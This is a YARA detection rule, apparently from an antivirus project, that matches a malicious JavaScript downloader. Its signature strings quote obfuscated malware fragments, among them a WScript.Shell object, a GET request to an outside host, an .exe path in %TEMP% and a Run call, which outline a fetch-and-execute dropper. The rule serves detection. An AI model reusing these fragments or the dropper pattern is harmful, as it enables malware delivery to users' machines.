rule sig_20160328_f6ea6c6e888c2a45ec886fac8910e6ac {
  meta:
    description = "datamaliciousorder - file 20160328_f6ea6c6e888c2a45ec886fac8910e6ac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "65d076bc50c0fed4a3ed9647cb6847fba237dd853898f42c6f46c6744af40041"

  strings:
    $s1  = "function Deeid() {return Flbecnbtyd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SApEy57GWAxh.exe\";};" fullword ascii
    $s2  = "Vddnldisve[Pekcskjvt](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Qvyvpiec](Ucjjxnh() * 11)} while (Vddnldisve[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Flbecnbtyd = function Kvgdq() {return WScript[Btwoqy](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xhuxsesu(Llxiii, Zaugoeo){return Llxiii - Zaugoeo;};" fullword ascii
    $s6  = "function Mytegjn(Zujeblclyj){Flbecnbtyd[\"Run\"](Zujeblclyj, Dqxjgjvl, Dqxjgjvl);};" fullword ascii
    $s7  = "function Jczlbhezte() {return ((Hyotagn == true) && (Hyotagn == Ksmpumsafd)) ? 1 : Dqxjgjvl;};" fullword ascii
    $s8  = "function Mvbwtiiume()" fullword ascii
    $s9  = "Ksmpumsafd = true; " fullword ascii
    $s10 = "Hyotagn = true; " fullword ascii
    $s11 = "function Subtz(){return Btwoqy;};" fullword ascii
    $s12 = "function Ucjjxnh(){return 22;};" fullword ascii
    $s13 = "var Dxivtcg = new this[\"Date\"]();" fullword ascii
    $s14 = "var Ksmpumsafd = false;" fullword ascii
    $s15 = " while (Qphagc){" fullword ascii
    $s16 = "var Nivllqug = false;" fullword ascii
    $s17 = "function Nsqtrgkx(Cymqswvfyp) {var Jumtsefhl = (1, 2, 3, 4, 5, Cymqswvfyp); return Jumtsefhl;};" fullword ascii
    $s18 = "var Hyotagn = false;" fullword ascii
    $s19 = "function Ralbjmc(){return Dhgihdr;};" fullword ascii
    $s20 = "return Xhuxsesu(Uenyv, Emrcawz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}